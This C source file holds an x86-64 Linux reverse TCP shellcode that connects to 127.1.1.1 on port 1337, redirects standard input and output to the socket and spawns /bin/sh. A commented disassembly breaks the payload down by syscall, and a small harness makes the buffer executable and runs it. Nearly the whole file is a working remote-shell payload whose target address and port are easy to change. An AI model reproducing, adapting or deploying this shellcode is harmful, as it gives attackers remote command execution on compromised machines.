#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>

#define IP_ADDR 0x0101017f //127.1.1.1
#define PORT 0x3905 //1337

/* 

reverse tcp execve /bin/sh --  XX Bytes -- 17MAR2021 -- icon

sys_socket - open new socket - 19 bytes
0:  48 31 c0                xor    rax,rax
3:  50                      push   rax
4:  50                      push   rax
5:  b0 02                   mov    al,0x2
7:  50                      push   rax
8:  5f                      pop    rdi
9:  5e                      pop    rsi
a:  ff c6                   inc    esi
c:  5a                      pop    rdx
d:  b2 06                   mov    dl,0x6
f:  b0 29                   mov    al,0x29
11: 0f 05                   syscall 

sys_connect - connect socket to remote - 26 bytes
0:  97                      xchg   edi,eax
1:  b0 2a                   mov    al,0x2a
3:  6a 02                   push   0x2
5:  66 c7 44 24 02 05 39    mov    WORD PTR [rsp+0x2],0x3905
c:  c7 44 24 04 7f 01 01    mov    DWORD PTR [rsp+0x4],0x101017f
13: 01
14: 54                      push   rsp
15: 5e                      pop    rsi
16: b2 10                   mov    dl,0x10
18: 0f 05                   syscall 

sys_dup2 - duplicate stdin, stdout, stderr to socket - 11 bytes
0:  6a 03                   push   0x3
2:  5e                      pop    rsi
3:  b0 21                   mov    al,0x21
5:  ff ce                   dec    esi
7:  0f 05                   syscall
9:  75 f8                   jne    0x3 

sys_execve - execute /bin/sh - 19 bytes
0:  99                      cdq
1:  52                      push   rdx
2:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f2f6e69622f
9:  2f 73 68
c:  51                      push   rcx
d:  54                      push   rsp
e:  5f                      pop    rdi
f:  b0 3b                   mov    al,0x3b
11: 0f 05                   syscall 

*/

unsigned char rev_tcp[] = \
"\x48\x31\xC0\x50\x50\xB0\x02\x50\x5F\x5E\xFF\xC6\x5A\xB2\x06\xB0\x29\x0F\x05" \
"\x97\xB0\x2A\x6A\x02\x66\xC7\x44\x24\x02\x05\x39\xC7\x44\x24\x04\x7F\x01\x01\x01\x54\x5E\xB2\x10\x0F\x05"
"\x6A\x03\x5E\xB0\x21\xFF\xCE\x0F\x05\x75\xF8"
"\x99\x52\x48\xB9\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x51\x54\x5F\xB0\x3B\x0F\x05"

;
int main(int argc, char **argv){

    mprotect((void*)((intptr_t)rev_tcp & ~0xFFF), 8192, PROT_READ|PROT_EXEC);  

    int (*test)() = (int(*)())rev_tcp;
    test();
}
